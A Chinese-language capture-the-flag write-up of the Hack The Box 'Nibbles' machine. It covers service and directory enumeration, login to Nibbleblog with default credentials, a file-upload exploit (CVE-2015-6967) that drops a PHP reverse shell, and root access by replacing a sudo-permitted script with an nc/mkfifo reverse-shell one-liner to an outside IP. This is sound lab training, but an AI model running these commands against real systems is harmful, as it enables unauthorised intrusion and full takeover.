## namp

```Bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```



```Bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



## 80

看页面源码，指向另一个目录

![](https://secure2.wostatic.cn/static/khhP3JtMHddA8JCYJPKr3A/image.png?auth_key=1677500199-mbFXenTWJFd3XhYS5fxT8v-0-9a51d5d118de641cb52bda0402f8f027)

google下nibbleblog是一个博客系统

```Bash
walle@walle:~/machines/linux/nibbles$ searchsploit  nibble
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                       | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)        | php/remote/38489.rb

```

需要确认下版本信息，目录爆破一下 这里爆破加不加文件名后缀的区别非常大。

```Bash
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
```

- 从README页面中可以确认版本为 4.0.3
- 在update.php中也可以看到版本信息

searchexploit的exp必须用msf ， github中找到的脚本也需要，需要找到登录接口确认下用户名密码

```Bash
walle@walle:~/machines/linux/nibbles$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 50 -x php,txt,sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,sh
[+] Timeout:                 10s
===============================================================
2023/01/03 11:05:32 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
/feed.php             (Status: 200) [Size: 302]
/index.php            (Status: 200) [Size: 2987]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/sitemap.php          (Status: 200) [Size: 402]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/LICENSE.txt          (Status: 200) [Size: 35148]

```

从 /admin/users.xml中确认用户名admin

- 尝试默认密码 admin/nibbles 成功
- 尝试用下hydra ，先拿到错误关键字

![](https://secure2.wostatic.cn/static/8QaZibakztjEZ7K4zK7njk/image.png?auth_key=1677500199-gZyVu4T7CRKPy3dbJWVqNg-0-027a16acdc2045683547d03a64c29854)

出来一堆都是错的，而且输入错误次数过多，被锁了黑名单，进不去了。

![](https://secure2.wostatic.cn/static/dudt1JZx14hUm9kBGoLF5L/image.png?auth_key=1677500199-sBtBn1y5r7izkkTgKFjScW-0-b5a2f50e1493f9c4897a9c4f58d546b2)



利用拿到的用户名密码，跑exp脚本，去找个php的反弹shell脚本

```Bash
walle@walle:~/machines/linux/nibbles/CVE-2015-6967$ python exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
[+] Login Successful.
[+] Upload likely successfull.

```

另外一个ssh监听后拿到shell



## privilege escalation

sudo -l提示有个文件root运行，根据路径去/home/nibbler下面解压一下

```Bash
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```



- 代码审计，运行下脚本，没有什么特殊之处
- 直接重写覆盖为一个反弹shell，sudo运行后拿到root shell

```Bash
$ cat monitor.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.11 7788 >/tmp/f
$ sudo /home/nibbler/personal/stuff/monitor.sh


```

## beyond root

启动shell.php 有两种方式

- 利用github脚本直接启动， 这个脚本就是把下面的手动过程做了自动化

脚本里面包含如下方法： 登录， 上传shell-post方法上传，执行shell-get方法触发，main执行命令行参数解析以及函数调用。

- 看下漏洞的产生原因，找到上传脚本的位置，手动上传后手动触发

> 脚本上传后被重命名content/private/plugins/my_image/image.php

根据这个位置访问url，或者直接在去点击下面的文件。

![](https://secure2.wostatic.cn/static/ru8pnUSJZuab81wRjvYfex/image.png?auth_key=1677500199-iC8WsjK3piVpRn7nNtFXiT-0-ef2a5a4685d33dbceeb5bde7bb9a8efb)

